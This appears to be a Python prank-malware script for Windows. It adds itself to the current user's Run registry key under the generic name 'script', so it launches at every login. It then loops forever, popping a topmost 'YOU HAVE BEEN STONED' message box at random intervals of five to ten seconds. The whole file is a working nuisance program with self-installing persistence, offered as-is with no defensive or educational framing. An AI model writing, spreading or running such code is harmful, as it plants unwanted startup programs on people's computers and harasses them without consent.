import os
import subprocess as subs
import winreg
import ctypes
from datetime import datetime, timedelta
import random
import time
import ctypes
k=0

def add_to_registry(script_path):
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                        r"Software\Microsoft\Windows\CurrentVersion\Run",
                        0, winreg.KEY_SET_VALUE)
    try:
        # Set the value name to the script filename without the extension
        value_name = "script"
        winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ,
                         f'"{os.path.abspath(script_path)}" -u')
    finally:
        key.Close()


path=os.path.expandvars("%ALLUSERSPROFILE%\Microsoft\Windows\Start Menu\Programs\Startup")
a=str(subs.run(["cmd","/c","reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"],capture_output=True,encoding="utf-8").stdout)
l=a.split("\n")
p=0
for i in l:
    if "script" in i:
        k=1
        ctypes.windll.user32.MessageBoxW(0, "script already in registry",'message', 0)
        
        break

else:
    script_path = os.path.abspath(__file__)  # Get the path of the current script
    add_to_registry(script_path)
    ctypes.windll.user32.MessageBoxW(0, "added script in registry",'message', 0)


 
while True:
      
    current_time = datetime.now()
    if p==0:        
        secs=random.randint(5,10)
        newt = timedelta(seconds=secs)
        future_time = current_time + newt
        p=1
    current_time1 = datetime.now()
    if current_time1 >= future_time:
        p=0
        ctypes.windll.user32.MessageBoxW(None,"YOU HAVE BEEN STONED","HEY THERE",0x30 | 0 | 0x1000 )

    time.sleep(1)




